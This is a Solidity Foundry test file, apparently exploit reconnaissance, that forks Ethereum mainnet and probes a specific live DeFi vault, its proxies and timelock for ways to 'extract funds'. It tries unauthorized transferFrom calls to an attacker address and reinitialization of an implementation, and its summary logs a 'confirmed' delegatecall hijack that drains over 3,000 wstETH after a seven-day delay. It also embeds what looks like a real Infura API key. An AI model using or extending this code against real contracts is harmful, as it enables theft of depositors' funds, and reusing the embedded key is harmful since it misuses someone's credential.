// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

/**
 * Deep investigation into underlying strategies and any alternative
 * paths to extract funds from the protocol
 */
contract DeepStrategyExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // Contracts found in storage
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TraceWstETHHolders() public view {
        console.log("=== TRACING WSTETH HOLDERS IN PROTOCOL ===\n");

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH:", vaultBalance / 1e18);

        uint256 slot2Balance = IERC20(wstETH).balanceOf(VAULT_SLOT2);
        console.log("VAULT_SLOT2 wstETH:", slot2Balance / 1e18);

        uint256 slot5Balance = IERC20(wstETH).balanceOf(VAULT_SLOT5);
        console.log("VAULT_SLOT5 wstETH:", slot5Balance / 1e18);

        uint256 rcBalance = IERC20(wstETH).balanceOf(RC);
        console.log("RC wstETH:", rcBalance / 1e18);

        uint256 r0Balance = IERC20(wstETH).balanceOf(R0);
        console.log("R0 wstETH:", r0Balance / 1e18);

        uint256 timelockBalance = IERC20(wstETH).balanceOf(TIMELOCK);
        console.log("TIMELOCK wstETH:", timelockBalance / 1e18);

        // Check contract at VAULT_SLOT5's slot 5
        bytes32 vs5Slot5 = vm.load(VAULT_SLOT5, bytes32(uint256(5)));
        address vs5Slot5Addr = address(uint160(uint256(vs5Slot5)));
        console.log("\nVAULT_SLOT5's slot 5:", vs5Slot5Addr);

        if (vs5Slot5Addr.code.length > 0) {
            uint256 subBalance = IERC20(wstETH).balanceOf(vs5Slot5Addr);
            console.log("  wstETH balance:", subBalance / 1e18);
        }
    }

    function test_InvestigateVaultSlot2Deep() public view {
        console.log("=== VAULT_SLOT2 DEEP DIVE ===\n");
        console.log("Address:", VAULT_SLOT2);

        // Get owner
        bytes32 slot0 = vm.load(VAULT_SLOT2, bytes32(uint256(0)));
        address owner = address(uint160(uint256(slot0)));
        console.log("Owner (slot 0):", owner);

        // Check all storage slots
        console.log("\n--- All non-zero storage ---");
        for (uint256 i = 0; i < 30; i++) {
            bytes32 slot = vm.load(VAULT_SLOT2, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i);
                console.logBytes32(slot);

                address maybeAddr = address(uint160(uint256(slot)));
                if (maybeAddr != address(0) && maybeAddr.code.length > 0) {
                    console.log("  -> Contract:", maybeAddr);
                }
            }
        }

        // Try various view functions
        console.log("\n--- Function probing ---");

        (bool hasGetFee, bytes memory feeData) = VAULT_SLOT2.staticcall(abi.encodeWithSignature("getFee()"));
        if (hasGetFee && feeData.length >= 32) {
            console.log("Has getFee()");
        }

        (bool hasGetStrategy, bytes memory stratData) = VAULT_SLOT2.staticcall(abi.encodeWithSignature("strategy()"));
        if (hasGetStrategy && stratData.length >= 32) {
            address strat = abi.decode(stratData, (address));
            console.log("Has strategy():", strat);
        }

        (bool hasTotalAssets, bytes memory taData) = VAULT_SLOT2.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (hasTotalAssets && taData.length >= 32) {
            uint256 ta = abi.decode(taData, (uint256));
            console.log("totalAssets:", ta / 1e18);
        }
    }

    function test_CheckTAssetBackingFlow() public view {
        console.log("=== TASSET BACKING FLOW ===\n");

        // TASSET.totalAssets() should equal the wstETH that backs it
        (bool hasTotalAssets, bytes memory taData) = TASSET.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (hasTotalAssets && taData.length >= 32) {
            uint256 tassetTotalAssets = abi.decode(taData, (uint256));
            console.log("TASSET.totalAssets:", tassetTotalAssets / 1e18);
        }

        (bool hasTotalSupply, bytes memory tsData) = TASSET.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (hasTotalSupply && tsData.length >= 32) {
            uint256 totalSupply = abi.decode(tsData, (uint256));
            console.log("TASSET.totalSupply:", totalSupply / 1e18);
        }

        // Check underlying asset
        (bool hasAsset, bytes memory assetData) = TASSET.staticcall(abi.encodeWithSignature("asset()"));
        if (hasAsset && assetData.length >= 32) {
            address asset = abi.decode(assetData, (address));
            console.log("TASSET.asset:", asset);
        }

        // Check vault reference
        (bool hasVault, bytes memory vaultData) = TASSET.staticcall(abi.encodeWithSignature("vault()"));
        if (hasVault && vaultData.length >= 32) {
            address vault = abi.decode(vaultData, (address));
            console.log("TASSET.vault:", vault);
        }

        // Check controller reference
        (bool hasController, bytes memory ctrlData) = TASSET.staticcall(abi.encodeWithSignature("controller()"));
        if (hasController && ctrlData.length >= 32) {
            address ctrl = abi.decode(ctrlData, (address));
            console.log("TASSET.controller:", ctrl);
        }
    }

    function test_CheckTASsetStorageLayout() public view {
        console.log("=== TASSET STORAGE LAYOUT ===\n");

        // Check TASSET implementation
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address impl = address(uint160(uint256(vm.load(TASSET, implSlot))));
        console.log("TASSET implementation:", impl);

        // Scan storage
        console.log("\n--- Non-zero storage slots ---");
        for (uint256 i = 0; i < 30; i++) {
            bytes32 slot = vm.load(TASSET, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i);
                console.logBytes32(slot);

                address maybeAddr = address(uint160(uint256(slot)));
                if (maybeAddr != address(0) && maybeAddr.code.length > 0) {
                    console.log("  -> Contract:", maybeAddr);
                }
            }
        }
    }

    function test_FindAlternativeAccessPaths() public {
        console.log("=== ALTERNATIVE ACCESS PATH SEARCH ===\n");

        // Check if there's any contract that has high allowance from VAULT
        // that we might be able to exploit

        console.log("Checking allowances from VAULT to various contracts...\n");

        // Get all addresses we've seen
        address[] memory knownAddrs = new address[](15);
        knownAddrs[0] = RC;
        knownAddrs[1] = R0;
        knownAddrs[2] = TASSET;
        knownAddrs[3] = TIMELOCK;
        knownAddrs[4] = VAULT_SLOT2;
        knownAddrs[5] = VAULT_SLOT5;
        knownAddrs[6] = 0xd3E4C3552a3eEdA56c7A1d86768E67f7dcB2f25E; // Safe
        // Check contracts from TASSET storage
        knownAddrs[7] = address(uint160(uint256(vm.load(TASSET, bytes32(uint256(2))))));
        knownAddrs[8] = address(uint160(uint256(vm.load(TASSET, bytes32(uint256(3))))));
        knownAddrs[9] = address(uint160(uint256(vm.load(TASSET, bytes32(uint256(4))))));
        knownAddrs[10] = address(uint160(uint256(vm.load(TASSET, bytes32(uint256(5))))));
        knownAddrs[11] = address(uint160(uint256(vm.load(TASSET, bytes32(uint256(6))))));
        knownAddrs[12] = address(uint160(uint256(vm.load(VAULT_SLOT2, bytes32(uint256(0))))));
        knownAddrs[13] = address(uint160(uint256(vm.load(VAULT_SLOT5, bytes32(uint256(5))))));
        knownAddrs[14] = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;

        for (uint256 i = 0; i < knownAddrs.length; i++) {
            if (knownAddrs[i] == address(0)) continue;

            uint256 allowance = IERC20(wstETH).allowance(VAULT, knownAddrs[i]);
            if (allowance > 0) {
                console.log("VAULT->", knownAddrs[i]);
                if (allowance > 1e30) {
                    console.log("  Allowance: VERY HIGH");
                } else {
                    console.log("  Allowance:", allowance / 1e18, "wstETH");
                }

                // If this contract has allowance, check if we can exploit it
                if (knownAddrs[i].code.length > 0 && knownAddrs[i] != RC) {
                    console.log("  Investigating for exploit...");

                    // Try calling transferFrom on it
                    vm.startPrank(attacker);
                    (bool success, ) = knownAddrs[i].call(
                        abi.encodeWithSignature("transferFrom(address,address,uint256)", VAULT, attacker, 1e18)
                    );
                    if (success) {
                        console.log("  *** TRANSFERFROM SUCCEEDED! ***");
                    }
                    vm.stopPrank();
                }
            }
        }
    }

    function test_CheckRCEIP1967Slots() public view {
        console.log("=== RC EIP-1967 SLOTS ===\n");

        // Check if RC is actually a proxy itself
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address rcImpl = address(uint160(uint256(vm.load(RC, implSlot))));
        console.log("RC implementation (EIP-1967):", rcImpl);

        bytes32 adminSlot = bytes32(uint256(0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103));
        address rcAdmin = address(uint160(uint256(vm.load(RC, adminSlot))));
        console.log("RC admin (EIP-1967):", rcAdmin);

        bytes32 beaconSlot = bytes32(uint256(0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50));
        address rcBeacon = address(uint160(uint256(vm.load(RC, beaconSlot))));
        console.log("RC beacon (EIP-1967):", rcBeacon);
    }

    function test_CheckR0EIP1967Slots() public view {
        console.log("=== R0 EIP-1967 SLOTS ===\n");

        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address r0Impl = address(uint160(uint256(vm.load(R0, implSlot))));
        console.log("R0 implementation:", r0Impl);
        console.log("Expected (RC):", RC);
        console.log("Match:", r0Impl == RC);

        bytes32 adminSlot = bytes32(uint256(0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103));
        address r0Admin = address(uint160(uint256(vm.load(R0, adminSlot))));
        console.log("\nR0 admin:", r0Admin);
    }

    function test_ExploitImplementationDirectly() public {
        console.log("=== EXPLOIT IMPLEMENTATION DIRECTLY ===\n");

        // If we can call the implementation directly and it's uninitialized...
        // But we already know RC's vault slot points to 0x0...0002

        // What if we can initialize RC with our own parameters?
        // Let's check if it's initialized

        console.log("RC slot 0 (typically initialized flag or owner):");
        bytes32 slot0 = vm.load(RC, bytes32(uint256(0)));
        console.logBytes32(slot0);

        address slot0Addr = address(uint160(uint256(slot0)));
        console.log("As address:", slot0Addr);
        console.log("(This is the Timelock)\n");

        // The Timelock being at slot 0 means RC IS initialized
        // with Timelock as owner or Initializable's initialized flag

        // Check the Initializable _initialized value
        // In OZ Initializable, _initialized is stored at a specific slot
        // For upgradeable contracts, it's often packed in slot 0

        uint8 initialized = uint8(uint256(slot0));
        console.log("_initialized (if at slot 0 packed):", uint256(initialized));

        // Try reinitialize
        vm.startPrank(attacker);

        (bool reinitSuccess, ) = RC.call(
            abi.encodeWithSignature("initialize(address,address,address,uint32)", VAULT, wstETH, TASSET, uint32(0))
        );
        console.log("Reinitialize attempt success:", reinitSuccess);

        // Try initialize with different signature
        (bool init2, ) = RC.call(
            abi.encodeWithSignature("__RedemptionController_init()")
        );
        console.log("__RedemptionController_init() success:", init2);

        vm.stopPrank();
    }

    function test_Summary() public view {
        console.log("========================================");
        console.log("=== IMMEDIATE DRAIN INVESTIGATION SUMMARY ===");
        console.log("========================================\n");

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Target: VAULT wstETH =", vaultBalance / 1e18);
        console.log("Estimated USD value: $%d", (vaultBalance / 1e18) * 2300);

        console.log("\n=== CONFIRMED PATHS ===");
        console.log("1. Delegatecall hijack via R0 -> 7 DAY WAIT REQUIRED");
        console.log("   - R0 slot 4 delay = 604800 seconds (7 days)");
        console.log("   - Creates redemption, wait 7 days, finalize");
        console.log("   - Full drain confirmed: 3017+ wstETH");

        console.log("\n=== BLOCKED IMMEDIATE PATHS ===");
        console.log("1. RC direct call: vault slot = 0x2, not real VAULT");
        console.log("2. VAULT functions: owner = Timelock, no public withdraw");
        console.log("3. TASSET ERC4626: redeem/withdraw require R0");
        console.log("4. Timelock bypass: 5-day delay, executor role restricted");
        console.log("5. RC reinitialization: Already initialized");
        console.log("6. Storage collision: Computationally infeasible");
        console.log("7. Flash loan: No flash capability in protocol");
        console.log("8. Callback hooks: TASSET is not ERC777");

        console.log("\n=== CONCLUSION ===");
        console.log("No immediate drain path exists.");
        console.log("The 7-day redemption delay is the only protection,");
        console.log("and there is no unprivileged method to bypass it.");
    }
}
